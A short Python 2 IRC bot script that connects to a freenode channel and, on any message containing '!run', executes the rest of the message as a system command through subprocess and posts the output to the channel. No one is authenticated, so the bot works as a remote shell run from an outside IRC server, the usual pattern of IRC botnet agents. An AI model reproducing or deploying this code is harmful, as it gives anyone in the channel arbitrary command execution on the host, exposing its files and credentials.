# Import some necessary libraries.
import socket 
import time
import subprocess
import re

# Some basic variables used to configure the bot        
server 		= "chat.freenode.net" # Server
channel 	= "#test198" # Channel
botnick 	= "WhatABot" # Your bots nick
nicks 		= "WhatABot"
host_name 	= "Test"

# This is our first function! It will respond to server Pings.
def ping(): 
  ircsock.send("PONG :pingis\n")  

# This is the send message function, it simply sends messages to the channel.
def sendmsg(chan , msg): 
  pre = "PRIVMSG "+ chan +" :"+ msg +"\n"
  print "Sending" + pre
  ircsock.send("PRIVMSG "+ chan +" :"+ msg +"\n") 

# This function is used to join channels.
def joinchan(chan):
  pre = "JOIN " + chan + "\n"
  print pre
  ircsock.send("JOIN "+ chan +"\n")

# This function responds to a user that inputs "Hello Mybot"
def hello():
  pre = "PRIVMSG "+ channel +" :Hello!\n"
  print pre
  ircsock.send("PRIVMSG "+ channel +" :Hello!\n")

def command(msg):
  regex = '^(:(\S+) )?(\S+)( (?!:)(.+?))?( :(.+))?$'
  matchObj = re.match(regex, msg, re.M|re.I)
  trail = matchObj.group(6)
  commands = trail.split()
  commands.remove(commands[0])
  print commands

  output=subprocess.Popen(commands, stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
  pre = "PRIVMSG "+ channel +" :"+str(output)+"\n"
  ircsock.send(pre)
	
                  
ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Here we connect to the server using the port 6667
ircsock.connect((server, 6667)) 
ircsock.send('USER '+nicks+' host '+host_name+' : Nemus Brand Bot\r\n') 
# here we actually assign the nick to the bot
ircsock.send("NICK "+ botnick +"\n") 
# Join the channel using the functions we previously defined
joinchan(channel) 

# Be careful with these! it might send you to an infinite loop
while 1: 
  # receive data from the server
  ircmsg = ircsock.recv(2048) 
  # removing any unnecessary linebreaks.
  ircmsg = ircmsg.strip('\n\r')
  # Here we print what's coming from the server
  print(ircmsg) 

  # If we can find "Hello Mybot" it will call the function hello()
  if ircmsg.find(":Hello "+ botnick) != -1: 
    hello()

  if ircmsg.find(":!run") != -1:
  	command(ircmsg)

  # if the server pings us then we've got to respond!
  if ircmsg.find("PING :") != -1: 
    ping()
